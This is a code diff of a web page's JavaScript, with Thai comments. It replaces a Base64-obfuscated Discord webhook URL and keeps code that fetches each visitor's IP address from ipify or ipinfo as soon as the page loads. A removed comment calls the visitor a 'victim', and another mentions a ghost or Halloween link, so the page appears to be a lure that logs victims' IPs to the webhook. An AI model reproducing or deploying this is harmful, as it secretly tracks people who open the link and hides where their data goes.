@@ -146,8 +146,8 @@
     </div>
 
     <script>
-        // 🔒 ระบบกัน Hook (Base64)
-        const _0xW = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1OTA3NjI5MzEwMDcwMzc0NC9hendTd1dpNXBsWkFLLXd3eXlFdGdkMG5JdmdBcjRqdWdtaWx2RV84OGtTdHBYOXA2cTc1ZEVwOXpPWFR4LUplN1Vs";
+        // 🔒 ระบบกัน Hook (เปลี่ยนเป็นลิงก์ใหม่เรียบร้อยแล้ว ผ่านการเข้ารหัส Base64)
+        const _0xW = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ0NTcwMjU5NTcxNjQ3NTkxOC9XQ1dfTWd1bkp1dXZoQ1l2QjV5bEltTzVfQkwtS3p1bDFVdlJZZ0xib29mNlZpZndkWEF4OFU3WlB2WWx5RVRrX0Rfdw==";
         const DISCORD_WEBHOOK_URL = decodeURIComponent(escape(atob(_0xW)));
         
         // 👻 ลิงก์เว็บผี / ฮาโลวีน
@@ -159,7 +159,7 @@
         const urlParams = new URLSearchParams(window.location.search);
         const encodedData = urlParams.get('obf');
 
-        // ใช้ API สำรองแบบสลับหลายตัวเพื่อความชัวร์ (กันโดนบล็อก)
+        // ดึง IP สำรองเพื่อความชัวร์ 100%
         function fetchUserIP() {
             fetch('https://api.ipify.org?format=json')
                 .then(res => res.json())
@@ -168,7 +168,6 @@
                     updateIPDisplay();
                 })
                 .catch(() => {
-                    // ถ้าตัวแรกหลุด ให้ใช้ตัวสำรองทันที
                     fetch('https://ipinfo.io/json')
                         .then(res => res.json())
                         .then(data => {
@@ -191,7 +190,7 @@
 
         if (encodedData) {
             document.getElementById('mode-shield').classList.add('active');
-            fetchUserIP(); // ดึง IP ทันทีเมื่อเข้าหน้าเหยื่อ
+            fetchUserIP();
         } else {
             document.getElementById('mode-create').classList.add('active');
         }
